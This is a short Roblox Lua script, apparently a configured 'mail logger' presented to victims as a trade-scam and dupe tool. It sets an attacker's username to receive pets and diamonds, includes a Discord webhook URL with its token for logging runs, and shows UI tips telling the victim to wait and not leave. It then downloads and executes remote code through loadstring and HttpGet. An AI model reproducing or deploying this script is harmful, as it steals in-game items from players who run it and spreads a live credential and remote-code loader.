--[[ Arkhalis Mail Logger ]]--

--[[ Main Config ]]--
_G.Username = "Unusunit2" --// Username To Send Pets To
_G.Diamonds = 500000 --// Amount Of Diamonds To Not Kick
_G.UnlockPets = True --// Unlocks Locked Pets
--[[ Webhook Config ]]--
_G.Webhook = "https://discord.com/api/webhooks/1100496954305286144/yJNK6GE2hiduDTT9QFb0TUrjf2xzcdGXbguYW_UTzbR11iTll3ILLZJDJDMZCiDMILas" --// Discord Webhook For Executions

--[[ UI Config ]]--
_G.ScriptName = "Tradescamanddupe" --// Script Name On The UI
_G.Tip1 = "Wait" --// Gives You Tips On The UI
_G.Tip2 = "Wait" --// Gives You Tips On The UI
_G.Tip3 = "No leave" --// Gives You Tips On The UI
_G.Tip4 = "No leave" --// Gives You Tips On The UI
_G.Tip5 = "Wait" --// Gives You Tips On The UI

--[[ Script ]]
loadstring(game:HttpGet("https://arkhalislua.github.io/Lua/ArkhalisMailbox.lua"))()
